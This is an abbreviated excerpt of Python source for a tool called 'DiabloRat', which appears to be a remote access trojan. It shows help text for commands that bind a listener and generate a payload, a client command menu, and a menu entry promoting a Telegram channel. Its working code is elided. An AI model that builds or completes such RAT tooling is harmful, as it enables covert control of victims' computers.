...
'--help' argument. For example: 'python3 DiabloRat generate --help'
will print help manual for generate commmand
"""

__HELP_BIND__   = """usage: python3 DiabloRat.py bind [--address ADDRESS] [--port PORT]
...
__HELP_GENERATE__ = """
usage: python3 DiabloRat.py generate [--address ADDRESS] [--port PORT] [--output OUTPUT]
...
class PULL:
    ...
    def help_c_general(self):
        ...
        lister  = [
            ...
            ('disconnect', 'Disconnect from Current Client'),
            ('clear', 'Clear Screen'),
            ('exit', 'Exit from DiabloRat!'),
            ('SWICYBERLWA7DA','https://t.me/digitalactivityhaven'),
        ]
        sys.stdout.write("\n")
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write("\n")
